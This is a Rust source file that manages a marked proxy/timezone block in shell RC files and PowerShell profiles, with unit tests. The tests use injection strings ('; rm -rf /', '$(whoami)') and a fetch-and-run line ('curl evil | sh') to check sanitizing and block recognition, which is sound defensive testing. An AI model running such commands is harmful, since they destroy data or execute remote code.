//! Shell profile blocks (zsh/bash RC files and PowerShell `$PROFILE`): building, upserting and removing
//! the Zastava guard block that exports proxy / timezone / locale variables.

use super::{FileCtx, NO_PROXY_VALUE, ZASTAVA_RC_END, ZASTAVA_RC_START};
use std::ops::Range;
use std::path::{Path, PathBuf};

pub(super) fn normalize_proxy_url_and_port(proxy_addr_or_url: &str) -> (String, u16) {
    let trimmed = proxy_addr_or_url
        .trim()
        .trim_end_matches("/proxy.pac")
        .trim_end_matches('/');
    let url = if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
        trimmed.to_string()
    } else {
        format!("http://{trimmed}")
    };
    let port = trimmed
        .rsplit_once(':')
        .and_then(|(_, p)| p.parse::<u16>().ok())
        .unwrap_or(8899);
    (url, port)
}

/// Builds the shell RC block that enables proxy variables in new terminals ONLY when
/// Zastava is actively listening on `127.0.0.1:<port>`. If Zastava is closed, `nc -z`
/// exits immediately and the terminal works directly without proxy errors.
pub fn build_shell_rc_guard_block(proxy_url: &str, port: u16) -> String {
    build_shell_rc_guard_block_with_tz(proxy_url, port, None)
}

/// Validates and sanitizes a timezone identifier string.
/// Returns Some(sanitized) if valid (non-empty, len <= 64, ASCII alphanumeric + '/' | '_' | '-' | '+').
pub fn sanitize_timezone(tz: &str) -> Option<String> {
    let trimmed = tz.trim();
    if trimmed.is_empty() || trimmed.len() > 64 {
        return None;
    }
    if trimmed
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '_' | '-' | '+'))
    {
        Some(trimmed.to_string())
    } else {
        None
    }
}

/// Builds the shell RC block including optional timezone and clean UTF-8 locale sync.
pub fn build_shell_rc_guard_block_with_tz(proxy_url: &str, port: u16, tz: Option<&str>) -> String {
    let mut tz_exports = String::new();
    if let Some(timezone) = tz.and_then(sanitize_timezone) {
        tz_exports = format!(
            "\n  export TZ=\"{timezone}\"\n  export LANG=\"en_US.UTF-8\"\n  export LC_TIME=\"en_US.UTF-8\"\n  export LC_ALL=\"en_US.UTF-8\""
        );
    }
    format!(
        "{start}\nif command -v nc >/dev/null 2>&1 && nc -z 127.0.0.1 {port} >/dev/null 2>&1; then\n  export HTTP_PROXY=\"{url}\"\n  export HTTPS_PROXY=\"{url}\"\n  export ALL_PROXY=\"{url}\"\n  export http_proxy=\"{url}\"\n  export https_proxy=\"{url}\"\n  export all_proxy=\"{url}\"\n  export NO_PROXY=\"{no_proxy}\"\n  export no_proxy=\"{no_proxy}\"{tz_exports}\nfi\n{end}",
        start = ZASTAVA_RC_START,
        port = port,
        url = proxy_url,
        no_proxy = NO_PROXY_VALUE,
        tz_exports = tz_exports,
        end = ZASTAVA_RC_END
    )
}

/// Builds the PowerShell profile block with proxy settings and optional timezone/locale.
/// Wraps proxy assignments inside a zero-latency kernel TCP listener check so PowerShell never hangs
/// or fails when Zastava is closed or uninstalled. When Zastava is down the block sets nothing and removes nothing.
pub fn build_powershell_guard_block_with_tz(proxy_url: &str, tz: Option<&str>) -> String {
    let (url, port) = normalize_proxy_url_and_port(proxy_url);
    let mut tz_assignment = String::new();
    if let Some(timezone) = tz.and_then(sanitize_timezone) {
        tz_assignment = format!("\n  $env:TZ = \"{timezone}\"");
    }

    format!(
        "{start}\n$__zastavaUp = $false\ntry {{\n  $__zastavaUp = [bool]([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpListeners() | Where-Object {{ $_.Port -eq {port} }})\n}} catch {{}}\nif ($__zastavaUp) {{\n  $env:HTTP_PROXY = \"{url}\"\n  $env:HTTPS_PROXY = \"{url}\"\n  $env:ALL_PROXY = \"{url}\"\n  $env:http_proxy = \"{url}\"\n  $env:https_proxy = \"{url}\"\n  $env:all_proxy = \"{url}\"\n  $env:NO_PROXY = \"{no_proxy}\"\n  $env:no_proxy = \"{no_proxy}\"\n  $env:LANG = \"en_US.UTF-8\"\n  $env:LC_TIME = \"en_US.UTF-8\"\n  $env:LC_ALL = \"en_US.UTF-8\"{tz_assignment}\n}}\n{end}",
        start = ZASTAVA_RC_START,
        port = port,
        url = url,
        no_proxy = NO_PROXY_VALUE,
        tz_assignment = tz_assignment,
        end = ZASTAVA_RC_END,
    )
}

/// The profile text cannot be edited safely: partial or repeated markers, a marker that is not on
/// a line of its own, or the end marker before the start marker.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) struct BlockAmbiguous;

/// Locates the Zastava block: from the first byte of the start marker line to the last byte of
/// the end marker (line end not included). The markers must be whole lines; any other occurrence
/// of the marker text, a missing partner or a wrong order is [`BlockAmbiguous`]. `Ok(None)`: the
/// file has no block at all.
pub(super) fn find_block(text: &str) -> Result<Option<Range<usize>>, BlockAmbiguous> {
    let mut starts = Vec::new();
    let mut ends = Vec::new();
    let mut pos = 0usize;
    for raw in text.split_inclusive('\n') {
        let line = raw.strip_suffix('\n').unwrap_or(raw);
        let line = line.strip_suffix('\r').unwrap_or(line);
        let body = if pos == 0 {
            line.trim_start_matches('\u{feff}')
        } else {
            line
        };
        let skip = line.len() - body.len();
        if body == ZASTAVA_RC_START {
            starts.push(pos + skip);
        } else if body == ZASTAVA_RC_END {
            ends.push(pos + line.len());
        }
        pos += raw.len();
    }
    if text.matches(ZASTAVA_RC_START).count() != starts.len()
        || text.matches(ZASTAVA_RC_END).count() != ends.len()
    {
        return Err(BlockAmbiguous);
    }
    match (starts.as_slice(), ends.as_slice()) {
        ([], []) => Ok(None),
        ([s], [e]) if s < e => Ok(Some(*s..*e)),
        _ => Err(BlockAmbiguous),
    }
}

fn detect_eol(text: &str) -> &'static str {
    match text.find('\n') {
        Some(i) if i > 0 && text.as_bytes()[i - 1] == b'\r' => "\r\n",
        _ => "\n",
    }
}

/// Puts `block` (lines separated by `\n`) into the profile: in place of the existing block, or
/// appended after a blank line. Every other byte of `text` stays as it is; the new lines use the
/// line ending of the file.
pub(super) fn upsert_block(text: &str, block: &str) -> Result<String, BlockAmbiguous> {
    let eol = detect_eol(text);
    let block = block.replace("\r\n", "\n").replace('\n', eol);
    if let Some(r) = find_block(text)? {
        return Ok(format!("{}{}{}", &text[..r.start], block, &text[r.end..]));
    }
    let mut out = text.to_string();
    if !text.trim_start_matches('\u{feff}').is_empty() {
        if !out.ends_with('\n') {
            out.push_str(eol);
        }
        out.push_str(eol); // the blank line that separates our block from the user's text
    }
    out.push_str(&block);
    out.push_str(eol);
    Ok(out)
}

/// Removes the block, the line end after it and the blank line that was put before it. The
/// text around is untouched; a profile without a block is returned unchanged.
pub(super) fn remove_block(text: &str) -> Result<String, BlockAmbiguous> {
    let Some(r) = find_block(text)? else {
        return Ok(text.to_string());
    };
    let (mut start, mut end) = (r.start, r.end);
    if text[end..].starts_with("\r\n") {
        end += 2;
    } else if text[end..].starts_with('\n') {
        end += 1;
    }
    let before = &text[..start];
    let content_before = before.trim_start_matches('\u{feff}');
    if content_before.ends_with("\r\n\r\n") {
        start -= 2;
    } else if content_before.ends_with("\n\n") {
        start -= 1;
    }
    Ok(format!("{}{}", &text[..start], &text[end..]))
}

/// The exact line an old build put into the `else` branch of the PowerShell block.
const OLD_POWERSHELL_ELSE_LINE: &str = "Remove-Item Env:HTTP_PROXY,Env:HTTPS_PROXY,Env:ALL_PROXY,Env:http_proxy,Env:https_proxy,Env:all_proxy,Env:TZ,Env:LANG,Env:LC_TIME,Env:LC_ALL -ErrorAction SilentlyContinue";

fn all_digits(s: &str) -> bool {
    !s.is_empty() && s.bytes().all(|c| c.is_ascii_digit())
}

fn assignment_is_generated(name: &str, value: &str) -> bool {
    match name {
        "HTTP_PROXY" | "HTTPS_PROXY" | "ALL_PROXY" | "http_proxy" | "https_proxy" | "all_proxy" => {
            value
                .strip_prefix("http://127.0.0.1:")
                .or_else(|| value.strip_prefix("http://localhost:"))
                .is_some_and(all_digits)
        }
        "NO_PROXY" | "no_proxy" => value == NO_PROXY_VALUE,
        "TZ" => sanitize_timezone(value).as_deref() == Some(value),
        "LANG" | "LC_TIME" | "LC_ALL" => value == "en_US.UTF-8",
        _ => false,
    }
}

fn quoted(s: &str) -> Option<&str> {
    let inner = s.strip_prefix('"')?.strip_suffix('"')?;
    (!inner.contains(['"', '$', '`', '\\'])).then_some(inner)
}

fn line_is_generated(line: &str) -> bool {
    let t = line.trim();
    if matches!(
        t,
        "" | "fi"
            | "try {"
            | "} catch {}"
            | "if ($__zastavaUp) {"
            | "}"
            | "} else {"
            | "$__zastavaUp = $false"
            | OLD_POWERSHELL_ELSE_LINE
    ) {
        return true;
    }
    if let Some(rest) = t.strip_prefix("if command -v nc >/dev/null 2>&1 && nc -z 127.0.0.1 ") {
        return rest
            .strip_suffix(" >/dev/null 2>&1; then")
            .is_some_and(all_digits);
    }
    if let Some(rest) = t.strip_prefix("$__zastavaUp = [bool]([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().GetActiveTcpListeners() | Where-Object { $_.Port -eq ") {
        return rest.strip_suffix(" })").is_some_and(all_digits);
    }
    if let Some(rest) = t.strip_prefix("export ") {
        return rest
            .split_once('=')
            .and_then(|(n, v)| quoted(v).map(|v| (n, v)))
            .is_some_and(|(n, v)| assignment_is_generated(n, v));
    }
    if let Some(rest) = t.strip_prefix("$env:") {
        return rest
            .split_once(" = ")
            .and_then(|(n, v)| quoted(v).map(|v| (n, v)))
            .is_some_and(|(n, v)| assignment_is_generated(n, v));
    }
    false
}

/// Whether `block` (as returned by `find_block`) consists only of lines a Zastava build writes,
/// with values that carry the Zastava gateway signature. A block the user edited, or anything
/// else, is not "generated" and is never removed without a journal record.
pub(super) fn is_generated_block(block: &str) -> bool {
    let lines: Vec<&str> = block
        .split('\n')
        .map(|l| l.strip_suffix('\r').unwrap_or(l))
        .collect();
    let (Some(first), Some(last)) = (lines.first(), lines.last()) else {
        return false;
    };
    lines.len() >= 2
        && *first == ZASTAVA_RC_START
        && *last == ZASTAVA_RC_END
        && lines[1..lines.len() - 1]
            .iter()
            .all(|l| line_is_generated(l))
}

/// PowerShell profiles of a user with the given home directory (Windows PowerShell and
/// PowerShell 7).
pub fn powershell_profile_paths(home: &Path) -> Vec<PathBuf> {
    let docs = home.join("Documents");
    vec![
        docs.join("PowerShell")
            .join("Microsoft.PowerShell_profile.ps1"),
        docs.join("WindowsPowerShell")
            .join("Microsoft.PowerShell_profile.ps1"),
    ]
}

/// PowerShell profiles of the current user (the real home; the scratch home in OS dry-run).
pub fn get_windows_powershell_profile_paths() -> Vec<PathBuf> {
    FileCtx::real()
        .map(|c| c.powershell_profiles())
        .unwrap_or_default()
}

/// Idempotently inserts or updates the Zastava CLI guard block inside a PowerShell profile file
/// content. A profile whose markers are partial or repeated is returned unchanged.
pub fn upsert_powershell_profile_content_with_tz(
    existing: &str,
    proxy_url: &str,
    tz: Option<&str>,
) -> String {
    let block = build_powershell_guard_block_with_tz(proxy_url, tz);
    upsert_block(existing, &block).unwrap_or_else(|_| existing.to_string())
}

/// Idempotently inserts or updates the Zastava CLI guard block inside a shell RC file content.
pub fn upsert_shell_rc_content(existing: &str, proxy_url: &str, port: u16) -> String {
    upsert_shell_rc_content_with_tz(existing, proxy_url, port, None)
}

/// Idempotently inserts or updates the Zastava CLI guard block with timezone synchronization.
pub fn upsert_shell_rc_content_with_tz(
    existing: &str,
    proxy_url: &str,
    port: u16,
    tz: Option<&str>,
) -> String {
    let block = build_shell_rc_guard_block_with_tz(proxy_url, port, tz);
    upsert_block(existing, &block).unwrap_or_else(|_| existing.to_string())
}

/// Removes the Zastava block from a profile text. Unchanged when there is none or when the
/// markers are ambiguous.
pub fn remove_shell_rc_block(existing: &str) -> String {
    remove_block(existing).unwrap_or_else(|_| existing.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_upsert_shell_rc_idempotent() {
        let initial = "export PATH=\"$HOME/.local/bin:$PATH\"\n";
        let updated1 = upsert_shell_rc_content(initial, "http://127.0.0.1:8899", 8899);
        assert!(updated1.contains("nc -z 127.0.0.1 8899"));
        assert!(updated1.contains("export HTTPS_PROXY=\"http://127.0.0.1:8899\""));

        // Second upsert with fallback port 8900 replaces the block without duplicating it
        let updated2 = upsert_shell_rc_content(&updated1, "http://127.0.0.1:8900", 8900);
        assert_eq!(updated2.matches(ZASTAVA_RC_START).count(), 1);
        assert!(updated2.contains("nc -z 127.0.0.1 8900"));
        assert!(!updated2.contains("127.0.0.1:8899"));

        let removed = remove_shell_rc_block(&updated2);
        assert!(!removed.contains(ZASTAVA_RC_START));
        assert!(!removed.contains(ZASTAVA_RC_END));
        assert!(removed.contains("export PATH="));
    }

    #[test]
    fn test_shell_rc_with_timezone() {
        let initial = "export PATH=\"$HOME/bin:$PATH\"\n";
        let updated = upsert_shell_rc_content_with_tz(
            initial,
            "http://127.0.0.1:8899",
            8899,
            Some("Europe/London"),
        );
        assert!(updated.contains("export TZ=\"Europe/London\""));
        assert!(updated.contains("export LANG=\"en_US.UTF-8\""));
        assert!(updated.contains("export LC_TIME=\"en_US.UTF-8\""));
        assert!(updated.contains("export LC_ALL=\"en_US.UTF-8\""));
        assert!(updated.contains("export HTTPS_PROXY=\"http://127.0.0.1:8899\""));
    }

    #[test]
    fn test_sanitize_timezone() {
        assert_eq!(
            sanitize_timezone("Europe/London"),
            Some("Europe/London".to_string())
        );
        assert_eq!(
            sanitize_timezone(" America/New_York "),
            Some("America/New_York".to_string())
        );
        assert_eq!(
            sanitize_timezone("Etc/GMT+3"),
            Some("Etc/GMT+3".to_string())
        );
        assert_eq!(sanitize_timezone(""), None);
        assert_eq!(sanitize_timezone("   "), None);
        assert_eq!(sanitize_timezone("Europe/Berlin; rm -rf /"), None);
        assert_eq!(sanitize_timezone("$(whoami)"), None);
    }

    #[test]
    fn test_powershell_profile_with_timezone() {
        let initial = "# Custom powershell user settings\nWrite-Host 'Welcome'\n";
        let updated = upsert_powershell_profile_content_with_tz(
            initial,
            "http://127.0.0.1:8899",
            Some("Europe/Warsaw"),
        );
        assert!(updated.contains("$__zastavaUp"));
        assert!(updated.contains("GetActiveTcpListeners()"));
        assert!(updated.contains("Port -eq 8899"));
        assert!(updated.contains("$env:HTTP_PROXY = \"http://127.0.0.1:8899\""));
        assert!(updated.contains("$env:TZ = \"Europe/Warsaw\""));
        assert!(updated.contains("$env:LANG = \"en_US.UTF-8\""));
        assert!(updated.contains("$env:LC_TIME = \"en_US.UTF-8\""));
        // A closed Zastava must never wipe the user's own variables from the session.
        assert!(!updated.contains("Remove-Item"));
        assert!(!updated.contains("else"));
        assert!(updated.contains(ZASTAVA_RC_START));
        assert!(updated.contains(ZASTAVA_RC_END));

        // Idempotent upsert replaces block
        let updated2 = upsert_powershell_profile_content_with_tz(
            &updated,
            "http://127.0.0.1:8900",
            Some("Europe/Berlin"),
        );
        assert_eq!(updated2.matches(ZASTAVA_RC_START).count(), 1);
        assert!(updated2.contains("Port -eq 8900"));
        assert!(updated2.contains("http://127.0.0.1:8900"));
        assert!(updated2.contains("Europe/Berlin"));
        assert!(!updated2.contains("Europe/Warsaw"));

        // Cleanup removes block
        let cleaned = remove_shell_rc_block(&updated2);
        assert!(!cleaned.contains(ZASTAVA_RC_START));
        assert!(!cleaned.contains("Europe/Berlin"));
        assert!(cleaned.contains("Write-Host 'Welcome'"));
    }

    // --- exact markers, byte-exact edits -----------------------------------------------------

    fn block() -> String {
        build_shell_rc_guard_block_with_tz("http://127.0.0.1:8899", 8899, None)
    }

    #[test]
    fn find_block_needs_the_exact_marker_lines() {
        let b = block();
        assert_eq!(find_block("export A=1\n").unwrap(), None);
        let t = format!("export A=1\n\n{b}\nafter\n");
        let r = find_block(&t).unwrap().unwrap();
        assert_eq!(&t[r], b);
        // BOM on the first line and CRLF line ends do not hide the markers.
        let bom = format!("\u{feff}{}\r\nx\r\n", b.replace('\n', "\r\n"));
        let r = find_block(&bom).unwrap().unwrap();
        assert_eq!(r.start, 3);
        assert!(bom[r].starts_with(ZASTAVA_RC_START) && bom.contains(ZASTAVA_RC_END));
        for bad in [
            format!("{ZASTAVA_RC_START}\n"),
            format!("{ZASTAVA_RC_END}\n"),
            format!("{ZASTAVA_RC_END}\n{ZASTAVA_RC_START}\n"),
            format!("{b}\n{b}\n"),
            format!("echo '{ZASTAVA_RC_START}'\n{b}\n"),
            format!("  {ZASTAVA_RC_START}\nx\n{ZASTAVA_RC_END}\n"),
        ] {
            assert_eq!(find_block(&bad), Err(BlockAmbiguous), "{bad}");
        }
    }

    #[test]
    fn upsert_replaces_in_place_and_remove_returns_the_original_bytes() {
        let user = "export PATH=\"$HOME/bin:$PATH\"\n# trailing comment\n";
        let once = upsert_block(user, &block()).unwrap();
        assert!(once.starts_with(user));
        let twice = upsert_block(&once, &block()).unwrap();
        assert_eq!(once, twice, "same block: the file is the same");
        let after = format!("{once}alias g=git\n");
        let moved = upsert_block(
            &after,
            &build_shell_rc_guard_block_with_tz("http://127.0.0.1:8900", 8900, None),
        )
        .unwrap();
        assert!(
            moved.ends_with("alias g=git\n"),
            "text after the block is not touched"
        );
        assert!(moved.starts_with(user));
        assert_eq!(remove_block(&once).unwrap(), user);
        assert_eq!(
            remove_block(&after).unwrap(),
            format!("{user}alias g=git\n")
        );
        assert_eq!(remove_block(user).unwrap(), user);
    }

    #[test]
    fn pure_wrappers_return_an_ambiguous_profile_unchanged() {
        let broken = format!("a\n{ZASTAVA_RC_START}\nb\n");
        assert_eq!(
            upsert_shell_rc_content(&broken, "http://127.0.0.1:8899", 8899),
            broken
        );
        assert_eq!(remove_shell_rc_block(&broken), broken);
        assert_eq!(
            upsert_powershell_profile_content_with_tz(&broken, "127.0.0.1:8899", None),
            broken
        );
    }

    #[test]
    fn generated_blocks_are_recognised_and_edited_ones_are_not() {
        let url = "http://127.0.0.1:8899";
        assert!(is_generated_block(&block()));
        assert!(is_generated_block(&build_shell_rc_guard_block_with_tz(
            url,
            8899,
            Some("Europe/Berlin")
        )));
        assert!(is_generated_block(&build_powershell_guard_block_with_tz(
            url,
            Some("Asia/Tokyo")
        )));
        assert!(is_generated_block(&block().replace('\n', "\r\n")));
        let edited = block().replace(
            "  export NO_PROXY=",
            "  export MY_OWN=1\n  export NO_PROXY=",
        );
        assert!(!is_generated_block(&edited));
        let corp = block().replace(
            "export HTTPS_PROXY=\"http://127.0.0.1:8899\"",
            "export HTTPS_PROXY=\"http://corp:3128\"",
        );
        assert!(!is_generated_block(&corp));
        let injected = block().replace("fi\n", "fi\ncurl evil | sh\n");
        assert!(!is_generated_block(&injected));
        assert!(!is_generated_block(ZASTAVA_RC_START));
    }

    #[test]
    fn powershell_paths_come_from_the_given_home() {
        let paths = powershell_profile_paths(Path::new("/h"));
        assert_eq!(paths.len(), 2);
        assert!(paths.iter().all(|p| p.starts_with("/h/Documents")));
    }
}
